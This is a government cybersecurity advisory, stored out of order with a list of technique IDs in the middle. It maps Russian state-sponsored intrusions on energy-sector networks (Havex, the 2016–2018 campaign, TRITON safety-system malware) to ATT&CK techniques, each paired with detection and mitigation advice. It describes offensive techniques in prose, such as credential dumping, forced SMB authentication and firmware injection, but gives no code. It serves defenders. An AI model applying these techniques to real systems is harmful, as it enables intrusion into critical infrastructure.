Monitor: monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network, which an adversary could introduce. Some monitoring tools may collect command-line arguments but may not capture DEL commands since DEL is a native function within cmd.exe.


Credential Access [TA0006]
Credentials from Password Stores: Credentials from Web Browsers [T1555.003]
Havex may contain a publicly available web browser password recovery tool.
Password Policies: set and enforce secure password policies for accounts.


Discovery [TA0007]
Account Discovery: Email Account [T1087.003]
Havex collects address book information from Outlook
Monitor: monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation (WMI) and PowerShell.


File and Directory Discovery [T1083]
Havex collects information about available drives, default browser, desktop file list, My Documents, internet history, program files, and root of available drives.
Monitor: monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as WMI and PowerShell.


Process Discovery [T1057]
Havex collects information about running processes.
Monitor: normal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as WMI and PowerShell.


System Information Discovery [T1082]
Havex collects information about the OS and computer name.

Monitor: monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as WMI and PowerShell.
In cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.



System Network Configuration Discovery [T1016]
Havex collects information about the internet adapter configuration.
Monitor: monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as WMI and PowerShell.


System Owner/User Discovery [T1033]
Havex collects usernames.


Collection [TA0009]
Archive Collected Data [T1560]
Havex writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.
Audit: audit or scan systems, permissions, insecure software, insecure configurations, etc., to identify potential weaknesses.


Command and Control [TA0011]
Data Encoding: Standard Encoding [T1132.001]
Havex uses standard Base64 + bzip2 or standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.
Detect: analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes using the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.



 
Table 2: ICS Domain Tactics and Techniques for Havex [3]



Tactic
Technique
Use


Initial Access
Spearphishing Attachment [T0865]
Havex is distributed through a Trojanized installer attached to emails.



Supply Chain Compromise [T0862]
Note: this activity also applies to Tactic: Drive by Compromise [T0817]

Havex is distributed through Trojanized installers planted on compromised vendor websites.


Execution
User Execution [T0863]
Execution of Havex relies on a user opening a Trojanized installer attached to an email.


Discovery
Remote System Discovery [T0846]
Havex uses Windows networking (WNet) to discover all the servers, including OPC servers that are reachable by the compromised machine over the network.


Remote System Information Discovery [T0888]
Havex gathers server information, including CLSID, server name, Program ID, OPC version, vendor information, running state, group count, and server bandwidth.


Collection
Automated Collection [T0802]
Havex gathers information about connected control systems devices.


Point & Tag Identification [T0861]
Havex can enumerate OPC tags; specifically tag name, type, access, and ID.


Inhibit Response Function
Denial of Service [T0814]
Havex has caused multiple common OPC platforms to intermittently crash. 


Impact
Denial of Control [T0813]
Havex can cause PLCs inability to control connected systems.



 
Global Energy Sector Campaign: 2016 to 2018 U.S. Energy Sector Targeting
Table 3 maps the 2016 to 2018 U.S. Energy Sector targeting activity to the MITRE ATT&CK Enterprise framework. Mitigations for techniques are also provided in table. For additional mitigations, refer to the Mitigations section of this advisory.
Table 3: Energy Sector Campaign, 2016 to 2018 targeting U.S. Energy Sector: Observed MITRE ATT&CK Enterprise Tactics and Techniques



Tactic
Technique
Use 
Detection/Mitigations


Reconnaissance [TA0043]
Gather Victim Identity Information: Credentials [T1589.001]

The threat actor harvested credentials of third-party commercial organizations by sending spearphishing emails that contained a PDF attachment. The PDF attachment contained a shortened URL that, when clicked, led users to a website that prompted the user for their email address and password.The threat actor harvested credentials of Energy Sector targets by sending spearphishing emails with a malicious Microsoft Word document or links to the watering holes created on compromised third-party websites.
Note: this activity also applies to: 

Tactic: Reconnaissance [TA0043], Technique: Phishing for Information [T1598]:

Spearphishing Attachment [T1598.002]
Spearphishing Link [T1598.003]





Software Configuration: implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.
User Training: train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.



Resource Development [TA0042]
Compromise Infrastructure: Server [T1584.004]
The threat actor created watering holes on compromised third-party organizations’ domains.
This activity typically takes place outside the visibility of target organizations, making detection of this behavior difficult. Ensure that users browse the internet securely. Prevent intentional and unintentional download of malware or rootkits, and users from accessing infected or malicious websites. Treat all traffic as untrusted, even if it comes from a partner website or popular domain.


Initial Access [TA0001]
Valid Accounts [T1078]
The threat actor obtained access to Energy Sector targets by leveraging compromised third-party infrastructure and previously compromised Energy Sector credentials against remote access services and infrastructure—specifically VPN, RDP, and Outlook Web Access—where MFA was not enabled.

Network Segmentation: architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.
MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.
Update Software: perform regular software updates to mitigate exploitation risk.
Exploit Protection: use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.
Application Isolation and Sandboxing: restrict execution of code to a virtual environment on or in transit to an endpoint system.



External Remote Services [T1133]
The threat actor installed VPN clients on compromised third-party targets to connect to Energy Sector networks.

Network Segmentation: architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.
MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
Limit Access to Resource Over Network: prevent access to file shares, remote access to systems, and unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.
Disable or Remove Program: remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.



Execution [TA0002]
Command and Scripting Interpreter: PowerShell [T1059.001]

During an RDP session, the threat actor used a PowerShell Script to create an account within a victim’s Microsoft Exchange Server. 
Note: this activity also applies to: 

Tactic: Persistence [TA0003], Technique: Create Account: Local Account [T1136.001] 



Antivirus/Antimalware: use signatures or heuristics to detect malicious software.
Code Signing: enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.
Disable or Remove Program: remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.
Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.



Command and Scripting Interpreter: Windows Command Shell [T1059.003]

The threat actor used a JavaScript with an embedded Command Shell script to:

Create a local administrator account; 
Disable the host-based firewall;
Globally open port 3389 for RDP access; and
Attempt to add the newly created account to the administrators group to gain elevated privileges. 

Note: this activity also applies to: 

Tactic: Credential Access [TA0006], Technique: Input Capture [T1056]
Tactic: Execution [TA0002], Technique: Command and Scripting Interpreter: JavaScript [T1059.007]
Tactic: Persistence [TA0003], Technique: Create Account: Local Account [T1136.001]


Execution Prevention: block execution of code on a system through application control, and/or script blocking.


Scheduled Task/Job: Scheduled Task [T1053.005]
The threat actor created a Scheduled Task to automatically log out of a newly created account every eight hours.

Audit: audit or scan systems, permissions, insecure software, insecure configurations, etc., to identify potential weaknesses.
Harden Operating System Configuration: make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.
Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.
User Account Management: manage the creation of, modification of, use of, and permissions associated with user accounts.



Persistence [TA0003]
Create Account: Local Account [T1136.001] 
The threat actor created local administrator accounts on previously compromised third-party organizations for reconnaissance and to remotely access Energy Sector targets.    MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.

MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.



Server Software Component: Web Shell [T1505.003]
The threat actor created webshells on Energy Sector targets’ publicly accessible email and web servers.
Detect: the portion of the webshell that is on the server may be small and look innocuous. Process monitoring may be used to detect Web servers that perform suspicious actions such as running cmd.exe or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network.


Defense Evasion [TA0005]
Indicator Removal on Host: Clear Windows Event Logs [T1070.001]

The threat actor created new accounts on victim networks to perform cleanup operations. The accounts created were used to clear the following Windows event logs: System, Security, Terminal Services, Remote Services, and Audit. 
The threat actor also removed applications they installed while they were in the network along with any logs produced. For example, the VPN client installed at one third-party commercial facility was deleted along with the logs that were produced from its use. Finally, data generated by other accounts used on the systems accessed were deleted.
Note: this activity also applies to:

Tactic: Persistence [TA0003], Technique: Create Account: Local Account [T1136.001]



Encrypt Sensitive Information: protect sensitive information with strong encryption.
Remote Data Storage: use remote security log and sensitive file storage where access can be controlled better to prevent exposure of intrusion detection log data or sensitive information.
Restrict File and Directory Permissions: restrict access by setting directory and file permissions that are not specific to users or privileged accounts.



Indicator Removal on Host: File Deletion [T1070.004]

The threat actor cleaned up target networks by deleting created screenshots and specific registry keys. 
The threat actor also deleted all batch scripts, output text documents, and any tools they brought into the environment, such as scr.exe.
Note: this activity also applies to:

Technique: Modify Registry [T1112]


Monitor: monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe. 


Technique: Masquerading [T1036]
After downloading tools from a remote server, the threat actor renamed the extensions.

Restrict File and Directory Permissions: restrict access by setting directory and file permissions that are not specific to users or privileged accounts.
Code Signing: enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.
Execution Prevention: block execution of code on a system through application control, and/or script blocking.



Credential Access [TA0006]
Brute Force: Password Cracking [T1110.002]

The threat actor used password-cracking techniques to obtain the plaintext passwords from obtained credential hashes.
The threat actor dropped and executed open-source and free password cracking tools such as Hydra, SecretsDump, and CrackMapExec, and Python.


MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
Password Policies: set and enforce secure password policies for accounts.



Forced Authentication [T1187]
Microsoft Word attachments sent via spearphishing emails leveraged legitimate Microsoft Office functions for retrieving a document from a remote server over Server Message Block (SMB) using Transmission Control Protocol ports 445 or 139. As a part of the standard processes executed by Microsoft Word, this request authenticates the client with the server, sending the user’s credential hash to the remote server before retrieving the requested file. (Note: transfer of credentials can occur even if the file is not retrieved.)

Password Policies: set and enforce secure password policies for accounts.
Filter Network Traffic: use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.



The threat actor’s watering hole sites contained altered JavaScript and PHP files that requested a file icon using SMB from an IP address controlled by the threat actors.



The threat actor manipulated LNK files to repeatedly gather user credentials. Default Windows functionality enables icons to be loaded from a local or remote Windows repository. The threat actor exploited this built-in Windows functionality by setting the icon path to a remote server controller by the actors. When the user browses to the directory, Windows attempts to load the icon and initiate an SMB authentication session. During this process, the active user’s credentials are passed through the attempted SMB connection. 
Note: this activity also applies to:

Tactic: Persistence [TA0003], Technique: Boot or Logon Autostart Execution: Shortcut Modification [T1547.009]




OS Credential Dumping: Local Security Authority Subsystem Service (LSASS) Memory [T1003.001]
The threat actor used an Administrator PowerShell prompt to enable the WDigest authentication protocol to store plaintext passwords in the LSASS memory. With this enabled, credential harvesting tools can dump passwords from this process’s memory.

Operating System Configuration: make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.
Password Policies: set and enforce secure password policies for accounts.
Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.
Privileged Process Integrity: protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.
User Training: train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.
Credential Access Protection: use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping.



OS Credential Dumping: NTDS [T1003.003]
The threat actor collected the files ntds.dit. The file ntds.dit is the Active Directory (AD) database that contains all information related to the AD, including encrypted user passwords.

Monitor: monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.
Privileged Account Management: manage the creation of, modification of, se of, and permissions associated with privileged accounts, including SYSTEM and root.
User Training: train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.



Discovery [TA0007]
Remote System Discovery [T1018]

The threat actor used privileged credentials to access the Energy Sector victim’s domain controller. Once on the domain controller, the threat actors used batch scripts dc.bat and dit.bat to enumerate hosts, users, and additional information about the environment. 
Note: this activity also applies to: 

Tactic: Persistence [TA0003], Technique: Valid Accounts: Domain Accounts [T1078.002]
Tactic: Discovery [TA0007], Technique: System Owner/User Discovery [T1033]



Monitor: normal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used.
Monitor processes and command-line arguments for actions that could be taken to gather system and network information.
Monitor for processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession.



The threat actor accessed workstations and servers on corporate networks that contained data output from control systems within energy generation facilities. The threat actors accessed files pertaining to ICS or supervisory control and data acquisition (SCADA) systems. 



The actor targeted and copied profile and configuration information for accessing ICS systems on the network. The threat actor copied Virtual Network Connection (VNC) profiles that contained configuration information on accessing ICS systems and took screenshots of a Human Machine Interface (HMI).
Note: this activity also applies to

Tactic: Discovery [TA0007], Technique File and Directory Discovery [T1083]
Tactic: [TA0009], Technique: Screen Capture [T1113]




File and Directory Discovery [T1083]

The actor used dirsb.bat to gather folder and file names from hosts on the network.
Note: this activity also applies to: 

Tactic: Execution [TA0002], Command and Scripting Interpreter: Windows Command Shell [T1059.003]


This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information.


The threat actor conducted reconnaissance operations within the network. The threat actor focused on identifying and browsing file servers within the intended victim’s network.


Lateral Movement [TA0008]
Lateral Tool Transfer [T1570]

The threat actor moved laterally via PsExec, batch scripts, RDP, VNC, and admin shares.
Note: this activity also applies to:

Tactic: Lateral Movement [TA0008], Techniques: 

Remote Services: Remote Desktop Protocol [T1021.001]
Remote Services: SMB/Windows Admin Shares [T1021.002]
Remote Services: VNC [T1021.005]





Network Intrusion Prevention: use intrusion detection signatures to block traffic at network boundaries.
Network Segmentation: architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.
Operating System Configuration: make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.
Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.
User Account Management: manage the creation of, modification o, se of, and permissions associated with user accounts.
Disable or Remove Feature or Program: remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.
Audit: audit or scan systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.
MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
Limit Access to Resource Over Network: prevent access to file shares, remote access to systems, and unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.
Filter Network Traffic: use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.
Limit Software Installation: block users or groups from installing unapproved software.



Collection [TA0009]
Data from Local System [T1005] 
The threat actor collected the Windows SYSTEM registry hive file, which contains host configuration information.

Monitor: monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data.
Data may also be acquired through Windows system management tools such as WMI and PowerShell.



Archive Collected Data: Archive via Utility [T1560.001]
The threat actor compressed the ntds.dit file and the SYSTEM registry hive they had collected into archives named SYSTEM.zip and comps.zip.
Audit: audit or scan systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.


Screen Capture [T1113]

The threat actor used Windows’ Scheduled Tasks and batch scripts, to execute scr.exe and collect additional information from hosts on the network. The tool scr.exe is a screenshot utility that the threat actor used to capture the screen of systems across the network.
Note: this activity also applies to: 

Tactic: Execution [TA0002], Techniques: 

Command and Scripting Interpreter: Windows Command Shell [T1059.003]
Scheduled Task/Job: Scheduled Task [T1053.005]





Network Segmentation: architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.
MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
Limit Access to Resource Over Network: prevent access to file shares, remote access to systems, and unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.
Disable or Remove Feature or Program: remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.




The actor used batch scripts labeled pss.bat and psc.bat to run the PsExec tool. PsExec was used to execute scr.exe across the network and to collect screenshots of systems in a text file.
Note: this activity also applies to: 

Tactic: Execution [TA0002], Techniques: 

Command and Scripting Interpreter: Windows Command Shell [T1059.003]
System Services: Service Execution [T1569.002]






Command and Control [TA0011]
Ingress Tool Transfer [T1105]
The threat actor downloaded tools from a remote server.    

Monitor: monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as File Transfer Protocol, that does not normally occur may also be suspicious.
Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.
Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.
Use intrusion detection signatures to block traffic at network boundaries.




 
TRITON Malware
Table 4 maps TRITON’s capabilities to the ATT&CK for ICS framework. For mitigations to harden ICS/OT environments, refer to the Mitigations section of this advisory.
Table 4: ICS Domain Tactics and Techniques for TRITON [4]



Initial Access
Engineering Workstation Compromise [T0818]
TRITON compromises workstations within the safety network. 


Execution

Change Operating Mode [T0858]
Note: this technique also applies to Evasion.

TRITON can halt or run a program through the TriStation protocol. (Note: TriStation protocol is the protocol that Triconex System software uses to communicate with the Tricon PLCs.) 


Execution through API [T0871]
TRITON leverages a custom implementation of the TriStation protocol, which triggers APIs related to program download, program allocation, and program changes.



Hooking [T0874]
Note: this technique also applies to Tactic: Privilege Escalation.

TRITON's injector modifies the address of the handler for a Tristation protocol command so that when the command is received, the payload may be executed instead of normal processing.


Modify Controller Tasking [T0821]
Some TRITON components are added to the program table on the Tricon so that they are executed by the firmware once each cycle.


Native API [T0834]
TRITON's payload takes commands from TsHi.ExplReadRam(Ex), TsHi.ExplWriteRam(Ex), and TsHi.ExplExec functions to perform operations on controller memory and registers using syscalls written in PowerPC shellcode.


Scripting [T0853]

TRITON communicates with Triconex Tricon PLCs using its custom Python script. This Python script communicates using four Python modules that collectively implement the TriStation protocol via User Datagram Protocol (UDP) 1502.
Note: this use also applies to:

Tactic: Command and Control │Technique: Commonly Used Port [T0885]




Persistence 

System Firmware [T0857]
Note: this technique also applies to Tactic: Inhibit Response Function.

TRITON's injector injects the payload into the Tricon PLCs’ running firmware. A threat actor can use the payload to read and write memory on the PLC and execute code at an arbitrary address within the firmware. If the memory address it writes to is within the firmware region, the malicious payload disables address translation, writes the code at the provided address, flushes the instruction cache, and re-enables address translation. This allows the malware to change the running firmware.


Privilege Escalation
Exploitation for Privilege Escalation [T0890]
TRITON can gain supervisor-level access and control system states by exploiting a vulnerability.


Evasion
Exploitation for Evasion [T0820]
TRITON's injector exploits a vulnerability in the device firmware to escalate privileges and then it disables and (later patches) a firmware RAM/ROM consistency check. 


Indicator Removal on Host [T0872]
After running the malicious payload, TRITON's Python script overwrites the malicious payload with a “dummy” program.


Masquerading [T0849]
TRITON’s Python script masquerades as legitimate Triconex software.


TRITON’s injector masquerades as a standard compiled PowerPC program for the Triconex PLC.


Discovery
Remote System Discovery [T0846]
TRITON’s Python script can autodetect Triconex PLCs on the network by sending a UDP broadcast packet over port 1502.


Lateral Movement
Program Download [T0843]
TRITON leverages the TriStation protocol to download programs to the Tricon PLCs.


Collection
Detect Operating Mode [T0868]
A TRITON Python module provides string representations of different features of the TriStation protocol, including message and error codes, key position states, and other values returned by the status functions.


Program Upload [T0845]
TRITON uploads its payload to the Tricon PLCs.


Impair Process Control
Unauthorized Command Message [T0855]
A threat actor can use TRITON to prevent the Tricon PLC from functioning appropriately.


Impact
Loss of Safety [T0880]
TRITON can reprogram the safety PLC logic to allow unsafe conditions or state to persist.




Revisions

March 24, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0008', 'T1505.003', 'T1112', 'T0890', 'T0868', 'T0814', 'T0817', 'T1570', 'T0874', 'T0834', 'T1547.001', 'TA0009', 'T1136.001', 'TA0042', 'T1187', 'TA0007', 'T0846', 'TA0003', 'T1083', 'T1087.003', 'T1560', 'T1560.001', 'T0872', 'T1082', 'T0849', 'T0813', 'T1056', 'T0871', 'TA0002', 'T1598.003', 'T0888', 'T1598', 'T1055', 'T1059.003', 'T1555.003', 'T1036', 'T1021.002', 'T0843', 'T1584.004', 'TA0006', 'T0855', 'T1110.002', 'T1003.001', 'T0858', 'TA0043', 'T1132.001', 'T0865', 'T0862', 'T1078', 'T0885', 'T1070.004', 'T1133', 'T0802', 'T1059.001', 'T1033', 'T0880', 'T1021.005', 'T1021.001', 'T0863', 'T1547.009', 'T1569.002', 'T1005', 'TA0005', 'T1016', 'T1018', 'T1113', 'T1105', 'T0845', 'TA0011', 'T1078.002', 'T1598.002', 'T0821', 'TA0001', 'T1057', 'T0820', 'T0861', 'T0857', 'T1059.007', 'T0818', 'T1003.003', 'TA0004', 'T1053.005', 'T0853', 'T1070.001', 'T1589.001'}","




Summary

Actions to Take Today to Protect Energy Sector Networks:• Implement and ensure robust network segmentation between IT and ICS networks.• Enforce MFA to authenticate to a system.• Manage the creation of, modification of, use of—and permissions associated with—privileged accounts.
This joint Cybersecurity Advisory (CSA)—coauthored by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the Department of Energy (DOE)—provides information on multiple intrusion campaigns conducted by state-sponsored Russian cyber actors from 2011 to 2018 and targeted U.S. and international Energy Sector organizations. CISA, the FBI, and DOE responded to these campaigns with appropriate action in and around the time that they occurred. CISA, the FBI, and DOE are sharing this information in order to highlight historical tactics, techniques, and procedures (TTPs) used by adversaries to target U.S. and international Energy Sector organizations.
On March 24, 2022, the U.S. Department of Justice unsealed indictments of three Russian Federal Security Service (FSB) officers and a Russian Federation Central Scientific Research Institute of Chemistry and Mechanics (TsNIIKhM) employee for their involvement in the following intrusion campaigns against U.S. and international oil refineries, nuclear facilities, and energy companies.,1,

Global Energy Sector Intrusion Campaign, 2011 to 2018: the FSB conducted a multi-stage campaign in which they gained remote access to U.S. and international Energy Sector networks, deployed ICS-focused malware, and collected and exfiltrated enterprise and ICS-related data. 

One of the indicted FSB officers was involved in campaign activity that involved deploying Havex malware to victim networks. 
The other two indicted FSB officers were involved in activity targeting U.S. Energy Sector networks from 2016 through 2018.


Compromise of Middle East-based Energy Sector organization with TRITON Malware, 2017: Russian cyber actors with ties to the TsNIIKhM gained access to and leveraged TRITON (also known as HatMan) malware to manipulate a foreign oil refinery’s ICS controllers. TRITON was designed to specifically target Schneider Electric’s Triconex Tricon safety systems and is capable of disrupting those systems. Schneider Electric has issued a patch to mitigate the risk of the TRITON malware’s attack vector; however, network defenders should install the patch and remain vigilant against these threat actors’ TTPs.

The indicted TsNIIKhM cyber actor is charged with attempt to access U.S. protected computer networks and to cause damage to an energy facility.
The indicted TsNIIKhM cyber actor was a co-conspirator in the deployment of the TRITON malware in 2017.



This CSA provides the TTPs used by indicted FSB and TsNIIKhM actors in cyber operations against the global Energy Sector. Specifically, this advisory maps TTPs used in the global Energy Sector campaign and the compromise of the Middle East-based Energy Sector organization to the MITRE ATT&CK for Enterprise and ATT&CK for ICS frameworks.
CISA, the FBI, and DOE assess that state-sponsored Russian cyber operations continue to pose a threat to U.S. Energy Sector networks. CISA, the FBI, and DOE urge the Energy Sector and other critical infrastructure organizations to apply the recommendations listed in the Mitigations section of this advisory and Appendix A to reduce the risk of compromise. 
For more information on Russian state-sponsored malicious cyber activity, see CISA's Russia Cyber Threat Overview and Advisories webpage. For more information on the threat of Russian state-sponsored malicious cyber actors to U.S. critical infrastructure as well as additional mitigation recommendations, see joint CSA Understanding and Mitigating Russian State-Sponsored Cyber Threats to U.S. Critical Infrastructure and CISA's Shields Up Technical Guidance webpage. 
Rewards for Justice Program
If you have information on state-sponsored Russian cyber operations targeting U.S. critical infrastructure, contact the Department of State’s (DOS) Rewards for Justice program. You may be eligible for a reward of up to $10 million, which DOS is offering for information leading to the identification or location of any person who, while acting under the direction or control of a foreign government, participates in malicious cyber activity against U.S. critical infrastructure in violation of the Computer Fraud and Abuse Act (CFAA). Contact +1-202-702-7843 on WhatsApp, Signal, or Telegram, or send information via the Rewards for Justice secure Tor-based tips line located on the Dark Web. For more details refer to rewardsforjustice.net.
Click here for a PDF version of this report. 

Technical Details

Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 10, and the ATT&CK for ICSs framework. See the ATT&CK for Enterprise and ATT&CK for ICS frameworks for all referenced threat actor tactics and techniques.
Global Energy Sector Intrusion Campaign, 2011 to 2018
From at least 2011 through 2018, the FSB (also known as Berserk Bear, Energetic Bear, TeamSpy, Dragonfly, Havex, Crouching Yeti, and Koala) conducted an intrusion campaign against international and U.S. Energy Sector organizations. The threat actor gained remote access to and deployed malware designed to collect ICS-related information on compromised Energy Sector networks, and exfiltrated enterprise and ICS data.
Beginning in 2013 and continuing through 2014, the threat actor leveraged Havex malware on Energy Sector networks. The threat actor gained access to these victim networks via spearphishing emails, redirects to compromised websites, and malicious versions of legitimate software updates on multiple ICS vendor websites. The new software updates contained installations of Havex malware, which infected systems of users who downloaded the compromised updates.
Havex is a remote access Trojan (RAT) that communicates with a command and control (C2) server. The C2 server deploys payloads that enumerate all collected network resources and uses the Open Platform Communications (OPC) standard to gather information about connected control systems devices and resources within the network. Havex allowed the actor to install additional malware and extract data, including system information, lists of files and installed programs, e-mail address books, and virtual private network (VPN) configuration files. The Havex payload can cause common OPC platforms to crash, which could cause a denial-of-service condition on applications that rely on OPC communications. Note: for additional information on Havex, see to CISA ICS Advisory ICS Focused Malware and CISA ICS Alert ICS Focused Malware (Update A).
Beginning in 2016, the threat actor began widely targeting U.S. Energy Sector networks. The actor conducted these attacks in two stages: first targeting third-party commercial organizations (such as vendors, integrators, and suppliers) and then targeting Energy Sector organizations. The threat actor used the compromised third-party infrastructure to conduct spearphishing, watering hole, and supply chain attacks to harvest Energy Sector credentials and to pivot to Energy Sector enterprise networks. After obtaining access to the U.S. Energy Sector networks, the actor conducted network discovery, moved laterally, gained persistence, then collected and exfiltrated information pertaining to ICS from the enterprise, and possibly operational technology (OT), environments. Exfiltrated information included: vendor information, reference documents, ICS architecture, and layout diagrams.
For more detailed information on FSB targeting of U.S. Energy Sector networks, See CISA Alert Russian Government Cyber Activity Targeting Energy Sector and Other Critical Infrastructure Sectors.  
Refer to Appendix A for TTPs of Havex malware and TTPs used by the actor in the 2016 to 2018 targeting of U.S. Energy Sector networks, as well as associated mitigations.
Compromise of Middle East-based Energy Sector Organization with TRITON Malware, 2017
In 2017, Russian cyber actors with ties to TsNIIKhM gained access to and manipulated a foreign oil refinery’s safety devices. TsNIIKhM actors used TRITON malware on the ICS controllers, which resulted in the refinery shutting down for several days. 
TRITON is a custom-built, sophisticated, multi-stage malware affecting Schneider Electric’s Triconex Tricon, a safety programmable logic controller (PLC) (also referred to as a safety instrumented system,SIS,), which monitors industrial processes to prevent hazardous conditions. TRITON is capable of directly interacting with, remotely controlling, and compromising these safety systems. As these systems are used in a large number of environments, the capacity to disable, inhibit, or modify the ability of a process to fail safely could result in physical consequences. Note: for additional information on affected products, see to CISA ICS Advisory Schneider Electric Triconex Tricon (Update B).
TRITON malware affects Triconex Tricon PLCs by modifying in-memory firmware to add additional programming. The extra functionality allows an attacker to read/modify memory contents and execute custom code, disabling the safety system. 
TRITON malware has multiple components, including a custom Python script, four Python modules, and malicious shellcode that contains an injector and a payload. For detailed information on TRITON’s components, refer to CISA Malware Analysis Report (MAR): HatMan: Safety System Targeted Malware (Update B).
Note: the indicted TsNIIKhM cyber actor was also involved in activity targeting U.S. Energy Sector companies in 2018, and other TsNIIKhM-associated actors have targeted a U.S.-based company’s facilities in an attempt to access the company’s OT systems. To date, CISA, FBI, and DOE have no information to indicate these actors have intentionally disrupted any U.S. Energy Sector infrastructure. 
Refer to Appendix A for TTPs used by TRITON as well as associated mitigations. 

Mitigations

Enterprise Environment
